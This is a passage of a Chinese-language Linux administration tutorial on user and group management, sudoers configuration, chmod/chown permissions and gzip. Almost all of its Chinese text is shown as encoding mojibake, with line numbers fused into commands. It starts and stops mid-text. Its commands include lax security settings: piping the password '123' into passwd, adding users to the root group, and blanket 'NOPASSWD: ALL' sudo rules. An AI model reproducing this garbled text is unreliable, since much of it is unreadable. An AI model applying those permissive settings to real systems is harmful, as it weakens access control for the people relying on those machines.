ç¬¬äºŒä¸ªroot ï¼šæ‰€å±ç”¨æˆ·ç»„** 4096 ï¼šæ–‡ä»¶æˆ–è€…ç›®å½•çš„å¤§å°ï¼Œæ˜¯ç›®å½•çš„è¯ä¸€èˆ¬éƒ½æ˜¯4096 5æœˆ 24 00:15ï¼šæ–‡ä»¶çš„æœ€åç¼–è¾‘æ—¶é—´ é€šè¿‡ä»¥ä¸Šä¿¡æ¯å¾—çŸ¥ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½è®¾è®¡åˆ°ç”¨æˆ·å’Œç»„çš„æƒé™é—®é¢˜ åœ¨Linuxä¸­ï¼Œç”¨æˆ·æ˜¯èƒ½å¤Ÿè·å–ç³»ç»Ÿèµ„æºçš„æƒé™çš„é›†åˆï¼Œç»„æ˜¯æƒé™çš„å®¹å™¨ Linux ç”¨æˆ·ç±»å‹ ç”¨æˆ·ç±»å‹ æè¿° ç®¡ç†å‘˜root å…·æœ‰ä½¿ç”¨ç³»ç»Ÿæ‰€æœ‰æƒé™çš„ç”¨æˆ·,å…¶UID ä¸º0 ç³»ç»Ÿç”¨æˆ· ä¿éšœç³»ç»Ÿè¿è¡Œçš„ç”¨æˆ·,ä¸€èˆ¬ä¸æä¾›å¯†ç ç™»å½•ç³»ç»Ÿ,å…¶UIDä¸º1-499ä¹‹é—´ æ™®é€šç”¨æˆ· å³ä¸€èˆ¬ç”¨æˆ·,å…¶ä½¿ç”¨ç³»ç»Ÿçš„æƒé™å—é™,å…¶UIDä¸º500-60000ä¹‹é—´. ä¸Linuxç”¨æˆ·ä¿¡æ¯ç›¸å…³çš„æ–‡ä»¶æœ‰ä¸¤ä¸ªï¼šåˆ†åˆ«æ˜¯/etc/passwdå’Œ /etc/shadow 123456789101112# æŸ¥çœ‹æ–‡ä»¶/etc/passwdæ–‡ä»¶çš„å†…å®¹ï¼Œé€‰å–ç¬¬ä¸€è¡Œï¼šroot:x:0:0:root:/root:/bin/bashroot:ç”¨æˆ·åx:å¯†ç å ä½ç¬¦ï¼Œå¯†ç ä¿å­˜åœ¨shadowæ–‡ä»¶å†…0:ç”¨æˆ·idï¼ŒUID0:ç»„idï¼ŒGIDroot:æ³¨é‡Šä¿¡æ¯/root:ç”¨æˆ·å®¶ç›®å½•/bin/bash:ç”¨æˆ·é»˜è®¤ä½¿ç”¨shellç™»å½•å:åŠ å¯†å£ä»¤:æœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´:æœ€å°æ—¶é—´é—´éš”:æœ€å¤§æ—¶é—´é—´éš”:è­¦å‘Šæ—¶é—´:ä¸æ´»åŠ¨æ—¶é—´:å¤±æ•ˆæ—¶é—´:æ ‡å¿— Linuxç”¨æˆ·ç»„ç±»å‹ ç”¨æˆ·ç»„ç±»å‹ æè¿° ç³»ç»Ÿç»„ ä¸€èˆ¬åŠ å…¥ä¸€äº›ç³»ç»Ÿç”¨æˆ· æ™®é€šç”¨æˆ·ç»„ å¯ä»¥åŠ å…¥å¤šä¸ªç”¨æˆ· ç§æœ‰ç»„/åŸºæœ¬ç»„ å½“åˆ›å»ºç”¨æˆ·æ—¶,å¦‚æœæ²¡æœ‰ä¸ºå…¶æŒ‡æ˜æ‰€å±ç»„ï¼Œåˆ™å°±ä¸ºå…¶å®šä¹‰ä¸€ä¸ªç§æœ‰çš„ç”¨æˆ·ç»„ï¼Œèµ·åç§°ä¸ç”¨æˆ·ååŒåï¼Œå½“æŠŠå…¶ä»–ç”¨æˆ·åŠ å…¥åˆ°è¯¥ç»„ä¸­ï¼Œåˆ™å…¶å°±å˜æˆäº†æ™®é€šç»„ ä¸Linuxç”¨æˆ·ç»„ä¿¡æ¯ç›¸å…³çš„æ–‡ä»¶æœ‰ä¸¤ä¸ªï¼šåˆ†åˆ«æ˜¯/etc/groupå’Œ /etc/gshadow 12345# æŸ¥çœ‹æ–‡ä»¶/etc/groupæ–‡ä»¶å†…å®¹ï¼Œé€‰å–ä¸€ä¸ªæ™®é€šç»„è¡Œï¼šhadoop:x:500:hadoop:ç»„åx:ç»„å¯†ç å ä½ç¬¦500:ç»„id 2. ç”¨æˆ·æ“ä½œLinuxä¸­çš„ç”¨æˆ·ç®¡ç†ä¸»è¦æ¶‰åŠåˆ°ç”¨æˆ·è´¦å·çš„æ·»åŠ ã€åˆ é™¤å’Œä¿®æ”¹ã€‚æ‰€æœ‰æ“ä½œéƒ½å½±å“/etc/passwdä¸­çš„æ–‡ä»¶å†…å®¹ é€‰é¡¹12345678910111213-c&lt;å¤‡æ³¨&gt;ï¼šä¿®æ”¹ç”¨æˆ·å¸å·çš„å¤‡æ³¨æ–‡å­—ï¼›-d&lt;ç™»å…¥ç›®å½•&gt;ï¼šä¿®æ”¹ç”¨æˆ·ç™»å…¥æ—¶çš„ç›®å½•ï¼›-e&lt;æœ‰æ•ˆæœŸé™&gt;ï¼šä¿®æ”¹å¸å·çš„æœ‰æ•ˆæœŸé™ï¼›-f&lt;ç¼“å†²å¤©æ•°&gt;ï¼šä¿®æ”¹åœ¨å¯†ç è¿‡æœŸåå¤šå°‘å¤©å³å…³é—­è¯¥å¸å·ï¼›-g&lt;ç¾¤ç»„&gt;ï¼šä¿®æ”¹ç”¨æˆ·æ‰€å±çš„ç¾¤ç»„ï¼›-G&lt;ç¾¤ç»„&gt;ï¼›ä¿®æ”¹ç”¨æˆ·æ‰€å±çš„é™„åŠ ç¾¤ç»„ï¼›-l&lt;å¸å·åç§°&gt;ï¼šä¿®æ”¹ç”¨æˆ·å¸å·åç§°ï¼›-Lï¼šé”å®šç”¨æˆ·å¯†ç ï¼Œä½¿å¯†ç æ— æ•ˆï¼›-U:è§£é™¤å¯†ç é”å®šã€‚-s&lt;shell&gt;ï¼šä¿®æ”¹ç”¨æˆ·ç™»å…¥åæ‰€ä½¿ç”¨çš„shellï¼›-u&lt;uid&gt;ï¼šä¿®æ”¹ç”¨æˆ·IDï¼› å‚æ•° ç™»å½•åï¼šæŒ‡å®šè¦ä¿®æ”¹ä¿¡æ¯çš„ç”¨æˆ·ç™»å½•åã€‚ æ·»åŠ ç”¨æˆ· useradd spark usermod -G bigdata spark ## è®¾ç½®ç»„, sparkç”¨æˆ·æ·»åŠ åˆ°bigdataç»„ä¸­ usermod -c â€œmylove sparkâ€ spark ## -c: æ·»åŠ å¤‡æ³¨ä¿¡æ¯ ä¸€æ­¥å®Œæˆï¼šuseradd -G bigdata -c â€œmyloveâ€ spark # sparkç”¨æˆ·æ·»åŠ åˆ°bigdataç»„ä¸­, å¹¶è®¾ç½®å¤‡æ³¨ä¸º mylover useradd -u 508 -g 514 -G 1001 user3 æ·»åŠ ç”¨æˆ·user3æ—¶, æŒ‡å®šç”¨æˆ·uid å’Œ ä¸»ç»„-g, é™„å±ç»„-G, ç»„å¿…é¡»è¦å…ˆå­˜åœ¨ useradd -u(æ·»åŠ çš„æ—¶å€™ä¿®æ”¹ç”¨æˆ·id) 508 -g 514(-gæ˜¯æ·»åŠ ç»„, æ­¤ç»„å·ç å¿…é¡»å­˜åœ¨) æŒ‡å®šuser4 çš„å®¶ç›®å½• useradd -u 520 -g 1000 -d /home/user44 user4 1234567891011121314151617&gt; &gt; ä¸åˆ›å»ºuser4çš„å®¶ç›®å½•, user5åˆšåˆ›å»ºçš„æ—¶å€™, å®¶å°±è¢«æ¯äº†&gt; &gt; `useradd -u 508 -g 1000 -M user6&gt; &gt; &gt; &gt; å½“user6æ²¡æœ‰å®¶çš„æ—¶å€™, è¿™æ ·æ˜¾ç¤º&gt; &gt; `bash-4.1$ ....&gt; &gt; æ­¤æ—¶åº”è¯¥è¿™æ ·æ“ä½œ&gt; &gt; cp -v /etc/skel/.b* /home/user6&gt; &gt; "/etc/skel/.bash_logout" -&gt; "/home/user6/.bash_logout"&gt; &gt; "/etc/skel/.bash_profile" -&gt; "/home/user6/.bash_profile"&gt; &gt; "/etc/skel/.bashrc" -&gt; "/home/user6/.bashrc"&gt; &gt; su user6&gt; &gt; [user6@cts1 shixuanji]$ &gt; &gt; &gt; &gt; --------&gt; &gt; æŸ¥çœ‹è¿›ç¨‹ ps -au | grep xxx&gt; &gt; æ€æ­»è¿›ç¨‹ kill -9 xxx&gt; &gt; 123456&gt; &gt; # ä¸å…è®¸ç”¨æˆ·ç™»å½•&gt; &gt; useradd -u 523 -g 1000 -s /sbin/nologin user7&gt; &gt; &gt; &gt; # ä¿®æ”¹æ­¤ç”¨æˆ·ç™»å½•æƒé™ä¸º /bin/bash&gt; &gt; usermod -s /bin/bash user7&gt; &gt; è®¾ç½®å¯†ç  passwd spark æ ¹æ®æç¤ºè®¾ç½®å¯†ç å³å¯ åˆ›å»ºå¯†ç å·¥å…· mkpasswd ä¸‹è½½ï¼š yum -y install expect mkpasswd -l 14 åˆ›å»ºä¸€ä¸ª14ä½æ•°çš„å¯†ç  mkpasswd -l 15 -s 0: -sæ˜¯è®¾ç½®ç‰¹æ®Šç¬¦å·çš„é•¿åº¦, è¿™é‡Œæ˜¯ä¸è¦ç‰¹æ®Šç¬¦å· 123456789101112131415161718192021222324&gt; ### ä¿®æ”¹å¯†ç &gt; # æ­¤æ—¶åªéœ€è¦è¾“å…¥ä¸€éå¯†ç &gt; passwd --stdin user4 &gt; &gt; # é€šè¿‡ç®¡é“å¯ä»¥ç›´æ¥æ›´æ”¹&gt; echo "123" | passwd --stdin user4&gt; &gt; # é€šè¿‡æ‰‹åŠ¨è¾“å…¥å›è½¦ç¬¦ `\n` æ¥å®ç°2éç¡®è®¤ -eï¼šæ¿€æ´»è½¬ä¹‰å­—ç¬¦ã€‚&gt; echo -e "123\n123\n" | passwd user4&gt; &gt; =======#é¢å¤–çŸ¥è¯†ç‚¹&gt; # ä½¿ç”¨echo -eé€‰é¡¹æ—¶ï¼Œè‹¥å­—ç¬¦ä¸²ä¸­å‡ºç°ä»¥ä¸‹å­—ç¬¦ï¼Œåˆ™ç‰¹åˆ«åŠ ä»¥å¤„ç†ï¼Œè€Œä¸ä¼šå°†å®ƒå½“æˆä¸€èˆ¬æ–‡å­—è¾“å‡ºï¼š&gt; \a å‘å‡ºè­¦å‘Šå£°ï¼›&gt; \b åˆ é™¤å‰ä¸€ä¸ªå­—ç¬¦ï¼›&gt; \c æœ€åä¸åŠ ä¸Šæ¢è¡Œç¬¦å·ï¼›&gt; \f æ¢è¡Œä½†å…‰æ ‡ä»æ—§åœç•™åœ¨åŸæ¥çš„ä½ç½®ï¼›&gt; \n æ¢è¡Œä¸”å…‰æ ‡ç§»è‡³è¡Œé¦–ï¼›&gt; \r å…‰æ ‡ç§»è‡³è¡Œé¦–ï¼Œä½†ä¸æ¢è¡Œï¼›&gt; \t æ’å…¥tabï¼›&gt; \v ä¸\fç›¸åŒï¼›&gt; \ æ’å…¥\å­—ç¬¦ï¼›&gt; \nnn æ’å…¥nnnï¼ˆå…«è¿›åˆ¶ï¼‰æ‰€ä»£è¡¨çš„ASCIIå­—ç¬¦ï¼›&gt; &gt; ä¿®æ”¹ç”¨æˆ· ä¿®æ”¹sparkç™»å½•åä¸ºstormï¼šusermod -l spark storm å°†sparkæ·»åŠ åˆ°bigdataå’Œrootç»„ï¼šusermod -G root,bigdata spark æŸ¥çœ‹sparkçš„ç»„ä¿¡æ¯ï¼šgroups spark 1234567891011121314&gt; # usermod : usermodify&gt; # ä½¿ç”¨çš„å‚æ•°è·Ÿuseradd å‡ ä¹ä¸€æ ·&gt; &gt; chfn user4 : ä¿®æ”¹ç”¨æˆ·çš„finger, ç”µè¯, åŠå…¬å®¤ç­‰...&gt; # ä¿®æ”¹å, å…¶å®è¿™é‡Œå°±æ˜¯ä¿®æ”¹çš„å¤‡æ³¨é€‰é¡¹&gt; $ â˜ grep shixuanji /etc/passwd&gt; shixuanji:x:500:500:airpoet,sh,110,110:/home/shixuanji:/bin/bash&gt; &gt; # ä¿®æ”¹å¤‡æ³¨, è¿™é‡ŒåˆæŠŠä¹‹å‰æ”¹chfnåˆæ”¹äº†&gt; $ â˜ usermod -c "å“å‘€æˆ‘å»" shixuanji&gt; $ â˜ grep shixuanji /etc/passwd &gt; shixuanji:x:500:500:å“å‘€æˆ‘å»:/home/shixuanji:/bin/bash&gt; &gt; åˆ é™¤ç”¨æˆ· userdel -r spark åŠ ä¸€ä¸ª-rå°±è¡¨ç¤ºæŠŠç”¨æˆ·åŠç”¨æˆ·çš„å®¶ç›®å½•, ä¿¡ç®±åœ°å€ç­‰éƒ½åˆ é™¤ æŸ¥çœ‹ç”¨æˆ·çš„ä¿¡æ¯ id ç”¨æˆ·å rootç”¨æˆ·ä»¥å…¶ä»–ç”¨æˆ·çš„æƒé™æ‰§è¡ŒæŸæ¡å‘½ä»¤ 123[~] su -c "touch /tmp/shixuanji.txt" - shixuanji 22:32:02[~] ls -l /tmp/shixuanji.txt 22:32:25-rw-rw-r--. 1 shixuanji shixuanji 0 5æœˆ 29 22:32 /tmp/shixuanji.txt 3. ç»„æ“ä½œå‰é¢æˆ‘ä»¬çŸ¥é“ï¼Œç»„æ˜¯æƒé™çš„é›†åˆã€‚åœ¨linuxç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ä¸ªç”¨æˆ·ç»„ï¼Œæ²¡æœ‰æŒ‡å®šæ—¶éƒ½é»˜è®¤ä¸ºç§æœ‰ç»„ï¼Œç§æœ‰ç»„ååŒç”¨æˆ·åä¸€è‡´ï¼Œå»ºç«‹ç”¨æˆ·ç»„çš„å¥½å¤„æ˜¯ç³»ç»Ÿèƒ½å¯¹ä¸€ä¸ªç”¨æˆ·ç»„ä¸­çš„æ‰€æœ‰ç”¨æˆ·çš„æ“ä½œæƒé™è¿›è¡Œé›†ä¸­ç®¡ç†ã€‚ç»„ç®¡ç†æ¶‰åŠç»„çš„æ·»åŠ ã€åˆ é™¤å’Œä¿®æ”¹ã€‚ç»„çš„å¢åŠ ã€åˆ é™¤å’Œä¿®æ”¹å®é™…ä¸Šå°±å¯¹/etc/groupæ–‡ä»¶çš„æ›´æ–° æ·»åŠ ä¸€ä¸ªå«bigdataçš„ç»„ groupadd bigdata æŸ¥çœ‹ç³»ç»Ÿå½“å‰æœ‰é‚£äº›ç»„ cat /etc/group å°†sparkç”¨æˆ·æ·»åŠ åˆ°bigdataç»„ä¸­ usermod -G bigdata spark æˆ–è€… gpasswd -a spark bigdata è¿™ä¸¤ä¸ªå‘½ä»¤çš„åŒºåˆ†è®°å¿†æŠ€å·§ï¼š å‘½ä»¤æ˜¯ä»€ä¹ˆï¼Œå°±è¯æ˜å¯¹ä»€ä¹ˆåšæ“ä½œï¼Œæ‰€ä»¥æœ€åçš„å‚æ•°å°±æ˜¯å‘½ä»¤çš„æ“ä½œå¯¹è±¡ï¼Œä¸­é—´çš„å¯é€‰é¡¹è¡¨ç¤ºè¦å¹²å˜› å°†sparkç”¨æˆ·ä»bigdataç»„åˆ é™¤ gpasswd -d spark bigdata å°†bigdataç»„åä¿®æ”¹ä¸ºbigspark groupmod -n bigspark bigdata åˆ é™¤ç»„ groupdel bigdata 4. ä¸ºç”¨æˆ·é…ç½®sudoeræƒé™æ™®é€šæƒ…å†µä¸‹ï¼Œä½¿ç”¨æ™®é€šç”¨æˆ·è¿›è¡Œä¸€äº›ç®€å•çš„æ“ä½œå°±OKï¼Œä½†æ˜¯æ™®é€šç”¨æˆ·å’Œrootç”¨æˆ·çš„åŒºåˆ«å°±åœ¨äºrootç”¨æˆ·èƒ½å¯¹ç³»ç»Ÿåšä»»ä½•äº‹ï¼Œä½†æ˜¯æ™®é€šç”¨æˆ·å°±ä¸è¡Œã€‚å¤„å¤„å—é™ã€‚é‚£ä¹ˆå‡å¦‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ™®é€šç”¨æˆ·æƒ³æ‹¥æœ‰æ›´å¤§çš„æƒé™åšæ›´å¤šçš„äº‹æƒ…ï¼Œè™½ç„¶æœ‰æƒé™é™åˆ¶ï¼Œä½†ä¹Ÿä¸æ˜¯ä¸å¯ä»¥ã€‚éƒ¨åˆ†æ“ä½œè¿˜æ˜¯å¯ä»¥èµ‹äºˆæ›´é«˜çš„æƒé™è®©æ™®é€šç”¨æˆ·åšä¸€æ¬¡ã€‚è¿™å°±éœ€è¦ç»™æ™®é€šç”¨æˆ·é…ç½®rootæƒé™äº†ã€‚æ„æ€å°±æ˜¯è®©æ™®é€šç”¨æˆ·ä½¿ç”¨rootæƒé™å»åšä¸€äº›æ“ä½œï¼Œè¿™å½“ç„¶æ˜¯éœ€è¦é…ç½®çš„ã€‚ ç”¨rootç¼–è¾‘ vi /etc/sudoers ç›´æ¥ç”¨å‘½ä»¤ visudoä¹Ÿå¯ä»¥ç›´æ¥ç¼–è¾‘æ­¤æ–‡ä»¶ åœ¨æ–‡ä»¶çš„å¦‚ä¸‹ä½ç½®ï¼Œä¸ºhadoopæ·»åŠ ä¸€è¡Œå³å¯ root ALL=(ALL) ALL hadoop ALL=(ALL) ALL spark ALL=(ALL) ALL ç„¶åï¼Œhadoopç”¨æˆ·å’Œsparkç”¨æˆ·å°±å¯ä»¥ç”¨sudoæ¥æ‰§è¡Œç³»ç»Ÿçº§åˆ«çš„æŒ‡ä»¤ [hadoop\@hadoop01 ~]\$ sudo useradd huangxiaoming 123456789&gt; ~ â¤ su shixuanji # ä¿®æ”¹äº†é…ç½®æ–‡ä»¶ä¹‹å, ç”¨sudoå¯ä»¥è®¿é—®root&gt; [shixuanji@cts1 root]$ sudo /bin/ls /root&gt; [sudo] password for shixuanji:&gt; anaconda-ks.cfg date.txt Documents git-2018-05-22 install.log.syslog Music Public Videos&gt; autojump Desktop Downloads install.log k-vim Pictures Templates wget-log&gt; [shixuanji@cts1 root]$ ls /root&gt; ls: æ— æ³•æ‰“å¼€ç›®å½•/root: æƒé™ä¸å¤Ÿ&gt; [shixuanji@cts1 root]$&gt; è®©ä¸€ä¸ªæ™®é€šç”¨æˆ·å¯ä»¥æ— å¯†ç ç™»å½•åˆ°rootç”¨æˆ·, è¿˜æ˜¯ä¿®æ”¹é…ç½®æ–‡ä»¶ /etc/sudoers` ç¦æ­¢è¿œç¨‹ç™»å½• ä¿®æ”¹ vi /etc/ssh/sshd_config æ­¤æ–‡ä»¶ä¸­çš„ #PermitRootLogin yes ä¸º no è¿™æ ·å°±ä¸èƒ½è¿œç¨‹ ssh ç™»å½•äº† æŸ¥çœ‹ç³»ç»Ÿæ—¥å¿— æŸ¥çœ‹ç™»å½•é”™è¯¯ä¹‹ç±»çš„æ—¥å¿— tail /var log/secure æœ‰æ—¶å€™, ç™»å½•æ—¶, è¦è¿‡å‡ ç§’æ‰è®©è¾“å…¥ç™»å½•å¯†ç  ä¿®æ”¹ /etc/ssh/sshd_configä¸­çš„UseDNS=no, å°±ä¸ä¼šå»æ‰¾DNSäº† æ™®é€šç”¨æˆ·å…å¯†ä½¿ç”¨sudo &amp; å…å¯†ç™»å½•ä¸ºroot12345678vi /ect/sudoers# è®¾ç½®ä¸éœ€è¦ä½¿ç”¨å¯†ç ä½¿ç”¨sudoap ALL=(ALL) NOPASSWD: ALL # ä½¿ç”¨ sudo su - å…å¯†ç™»å½•åˆ°rootè´¦æˆ·User_Alias USER_SU=apCmnd_Alias SU=/bin/suUSER_SU ALL=(ALL) NOPASSWD: SU 5. åˆ‡æ¢ç”¨æˆ·åœ¨linuxçš„ç³»ç»Ÿä½¿ç”¨è¿‡ç¨‹å½“ä¸­ï¼Œå…ä¸äº†ä¼šæœ‰å¤šä¸ªç”¨æˆ·æ¥å›åˆ‡æ¢ä½¿ç”¨ã€‚ æ‰€ä»¥åœ¨æ­¤æä¾›åˆ‡æ¢ç”¨æˆ·çš„ä½¿ç”¨æ“ä½œï¼šåˆ‡æ¢ç”¨æˆ·ä½¿ç”¨çš„å‘½ä»¤æ˜¯ suï¼ˆswitch userï¼‰ ä»æ™®é€šç”¨æˆ·åˆ‡æ¢åˆ°rootç”¨æˆ· , éœ€è¦è¾“å¯†ç  su root æˆ– su ä»rootç”¨æˆ·åˆ‡æ¢åˆ°æ™®é€šç”¨æˆ·, ä¸éœ€è¦è¾“å¯†ç  su xxx 5. æ–‡ä»¶æƒé™1ã€linuxæ–‡ä»¶æƒé™çš„æè¿°æ ¼å¼è§£è¯»Linuxç”¨ æˆ·åˆ†ä¸ºï¼šæ‹¥æœ‰è€…ã€ç»„ç¾¤(Group)ã€å…¶ä»–ï¼ˆotherï¼‰ï¼ŒLinuxç³»ç»Ÿä¸­ï¼Œé¢„è®¾çš„æƒ…æ³ä¸‹ï¼Œç³»ç»Ÿä¸­æ‰€æœ‰çš„å¸å·ä¸ä¸€èˆ¬èº«ä»½ä½¿ç”¨è€…ï¼Œä»¥åŠrootçš„ç›¸å…³ä¿¡ æ¯ï¼Œ éƒ½æ˜¯è®°å½•åœ¨/etc/passwdæ–‡ä»¶ä¸­ã€‚æ¯ä¸ªäººçš„å¯†ç åˆ™æ˜¯è®°å½•åœ¨/etc/shadowæ–‡ä»¶ä¸‹ã€‚ æ­¤å¤–ï¼Œæ‰€æœ‰çš„ç»„ç¾¤åç§°è®°å½•åœ¨/etc/groupå…§ linuxæ–‡ä»¶çš„ç”¨æˆ·æƒé™çš„åˆ†æå›¾ 123456 -rw-r--r-- 1 user staff 651 Oct 12 12:53 .gitmodules# â†‘â•°â”¬â•¯â•°â”¬â•¯â•°â”¬â•¯# â”† â”† â”† â•°â”ˆ 0 å…¶ä»–äºº# â”† â”† â•°â”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆ g å±ç»„# â”† â•°â”ˆâ”ˆâ”ˆâ”ˆ u å±ä¸»# â•°â”ˆâ”ˆ ç¬¬ä¸€ä¸ªå­—æ¯ `d` ä»£è¡¨ç›®å½•ï¼Œ`-` ä»£è¡¨æ™®é€šæ–‡ä»¶ dï¼šæ ‡è¯†èŠ‚ç‚¹ç±»å‹ï¼ˆdï¼šæ–‡ä»¶å¤¹ -ï¼šæ–‡ä»¶ lï¼šé“¾æ¥ï¼‰ rï¼šå¯è¯» wï¼šå¯å†™ xï¼šå¯æ‰§è¡Œ æ–‡ä»¶ æ–‡ä»¶å¤¹ r å¯è¯»å–å†…å®¹ å¯ä»¥ls w å¯ä¿®æ”¹æ–‡ä»¶çš„å†…å®¹ å¯ä»¥åœ¨å…¶ä¸­åˆ›å»ºæˆ–è€…åˆ é™¤å­èŠ‚ç‚¹ x èƒ½å¦è¿è¡Œè¿™ä¸ªæ–‡ä»¶ èƒ½å¦cd**è¿›å…¥è¿™ä¸ªç›®å½•** 2ã€ ä¿®æ”¹æ–‡ä»¶æƒé™chmodå‘½ä»¤ ç”¨æ¥å˜æ›´æ–‡ä»¶æˆ–ç›®å½•çš„æƒé™ã€‚åœ¨UNIXç³»ç»Ÿå®¶æ—é‡Œï¼Œæ–‡ä»¶æˆ–ç›®å½•æƒé™çš„æ§åˆ¶åˆ†åˆ«ä»¥è¯»å–ã€å†™å…¥ã€æ‰§è¡Œ3ç§ä¸€èˆ¬æƒé™æ¥åŒºåˆ†ï¼Œå¦æœ‰3ç§ç‰¹æ®Šæƒé™å¯ä¾›è¿ç”¨ã€‚ç”¨æˆ·å¯ä»¥ä½¿ç”¨chmodæŒ‡ä»¤å»å˜æ›´æ–‡ä»¶ä¸ç›®å½•çš„æƒé™ï¼Œè®¾ç½®æ–¹å¼é‡‡ç”¨æ–‡å­—æˆ–æ•°å­—ä»£å·çš†å¯ã€‚ç¬¦å·è¿æ¥çš„æƒé™æ— æ³•å˜æ›´ï¼Œå¦‚æœç”¨æˆ·å¯¹ç¬¦å·è¿æ¥ä¿®æ”¹æƒé™ï¼Œå…¶æ”¹å˜ä¼šä½œç”¨åœ¨è¢«è¿æ¥çš„åŸå§‹æ–‡ä»¶ã€‚ è¯­æ³•12345chmod(é€‰é¡¹)(å‚æ•°)r=è¯»å–å±æ€§ //å€¼ï¼4 w=å†™å…¥å±æ€§ //å€¼ï¼2 x=æ‰§è¡Œå±æ€§ //å€¼ï¼1 é€‰é¡¹ï¼š u Userï¼Œå³æ–‡ä»¶æˆ–ç›®å½•çš„æ‹¥æœ‰è€…ï¼›g Groupï¼Œå³æ–‡ä»¶æˆ–ç›®å½•çš„æ‰€å±ç¾¤ç»„ï¼›o Otherï¼Œé™¤äº†æ–‡ä»¶æˆ–ç›®å½•æ‹¥æœ‰è€…æˆ–æ‰€å±ç¾¤ç»„ä¹‹å¤–ï¼Œå…¶ä»–ç”¨æˆ·çš†å±äºè¿™ä¸ªèŒƒå›´ï¼›a Allï¼Œå³å…¨éƒ¨çš„ç”¨æˆ·ï¼ŒåŒ…å«æ‹¥æœ‰è€…ï¼Œæ‰€å±ç¾¤ç»„ä»¥åŠå…¶ä»–ç”¨æˆ·ï¼›r è¯»å–æƒé™ï¼Œæ•°å­—ä»£å·ä¸ºâ€œ4â€;w å†™å…¥æƒé™ï¼Œæ•°å­—ä»£å·ä¸ºâ€œ2â€ï¼›x æ‰§è¡Œæˆ–åˆ‡æ¢æƒé™ï¼Œæ•°å­—ä»£å·ä¸ºâ€œ1â€ï¼›- ä¸å…·ä»»ä½•æƒé™ï¼Œæ•°å­—ä»£å·ä¸ºâ€œ0â€ï¼›s ç‰¹æ®ŠåŠŸèƒ½è¯´æ˜ï¼šå˜æ›´æ–‡ä»¶æˆ–ç›®å½•çš„æƒé™ã€‚ å‚æ•°: æƒé™æ¨¡å¼ï¼šæŒ‡å®šæ–‡ä»¶çš„æƒé™æ¨¡å¼ï¼›æ–‡ä»¶ï¼šè¦æ”¹å˜æƒé™çš„æ–‡ä»¶ã€‚ ç¤ºä¾‹å˜æ›´ æ–‡ä»¶/ç›®å½• çš„æƒé™ 1234567891011# ç›´æ¥ä¿®æ”¹chmod g-rw haha.dat ## è¡¨ç¤ºå°†haha.datå¯¹æ‰€å±ç»„çš„rwæƒé™å–æ¶ˆchmod o-rw haha.dat ## è¡¨ç¤ºå°†haha.datå¯¹å…¶ä»–äººçš„rwæƒé™å–æ¶ˆchmod u+x haha.dat ## è¡¨ç¤ºå°†haha.datå¯¹æ‰€å±ç”¨æˆ·çš„æƒé™å¢åŠ xchmod a-x haha.dat ## è¡¨ç¤ºå°†haha.datå¯¹æ‰€ç”¨æˆ·å–æ¶ˆxæƒé™# ä¹Ÿå¯ä»¥ç”¨æ•°å­—çš„æ–¹å¼æ¥ä¿®æ”¹æƒé™(å¸¸ç”¨)chmod 664 haha.datå°±ä¼šä¿®æ”¹æˆ rw-rw-r--å¦‚æœè¦å°†ä¸€ä¸ªæ–‡ä»¶å¤¹çš„æ‰€æœ‰å†…å®¹æƒé™ç»Ÿä¸€ä¿®æ”¹ï¼Œåˆ™å¯ä»¥-Rå‚æ•°chmod -R 770 aaa/ å˜æ›´ æ–‡ä»¶/ç›®å½• çš„æ‹¥æœ‰è€… æˆ– æ‰€å±ç»„ 1234# &lt;åªæœ‰rootæƒé™èƒ½æ‰§è¡Œ&gt;chown angela aaa ## æ”¹å˜æ‰€å±ç”¨æˆ·chown :angela aaa ## æ”¹å˜æ‰€å±ç»„chown angela:angela aaa/ ## åŒæ—¶ä¿®æ”¹æ‰€å±ç”¨æˆ·å’Œæ‰€å±ç»„ 6. å‹ç¼©æ‰“åŒ…gzipgzipæ˜¯åœ¨Linuxç³»ç»Ÿä¸­ç»å¸¸ä½¿ç”¨çš„ä¸€ä¸ªå¯¹æ–‡ä»¶è¿›è¡Œå‹ç¼©å’Œè§£å‹ç¼©çš„å‘½ä»¤ï¼Œæ—¢æ–¹ä¾¿åˆå¥½ç”¨ã€‚ gzipæ˜¯ä¸ªä½¿ç”¨å¹¿æ³›çš„å‹ç¼©ç¨‹åºï¼Œæ–‡ä»¶ç»å®ƒå‹ç¼©è¿‡åï¼Œå…¶åç§°åé¢ä¼šå¤šå¤„â€œ.gzâ€æ‰©å±•åã€‚ è¯­æ³• gzip (é€‰é¡¹) (å‚æ•°) é€‰é¡¹ 123456789101112131415161718-aæˆ–â€”â€”asciiï¼šä½¿ç”¨ASCIIæ–‡å­—æ¨¡å¼ï¼›-dæˆ–--decompressæˆ–----uncompressï¼šè§£å¼€å‹ç¼©æ–‡ä»¶ï¼›-fæˆ–â€”â€”forceï¼šå¼ºè¡Œå‹ç¼©æ–‡ä»¶ã€‚ä¸ç†ä¼šæ–‡ä»¶åç§°æˆ–ç¡¬è¿æ¥æ˜¯å¦å­˜åœ¨ä»¥åŠè¯¥æ–‡ä»¶æ˜¯å¦ä¸ºç¬¦å·è¿æ¥ï¼›-hæˆ–â€”â€”helpï¼šåœ¨çº¿å¸®åŠ©ï¼›-læˆ–â€”â€”listï¼šåˆ—å‡ºå‹ç¼©æ–‡ä»¶çš„ç›¸å…³ä¿¡æ¯ï¼›-Læˆ–â€”â€”licenseï¼šæ˜¾ç¤ºç‰ˆæœ¬ä¸ç‰ˆæƒä¿¡æ¯ï¼›-næˆ–--no-nameï¼šå‹ç¼©æ–‡ä»¶æ—¶ï¼Œä¸ä¿å­˜åŸæ¥çš„æ–‡ä»¶åç§°åŠæ—¶é—´æˆ³è®°ï¼›-Næˆ–â€”â€”nameï¼šå‹ç¼©æ–‡ä»¶æ—¶ï¼Œä¿å­˜åŸæ¥çš„æ–‡ä»¶åç§°åŠæ—¶é—´æˆ³è®°ï¼›-qæˆ–â€”â€”quietï¼šä¸æ˜¾ç¤ºè­¦å‘Šä¿¡æ¯ï¼›-ræˆ–â€”â€”recursiveï¼šé€’å½’å¤„ç†ï¼Œå°†æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åŠå­ç›®å½•ä¸€å¹¶å¤„ç†ï¼›-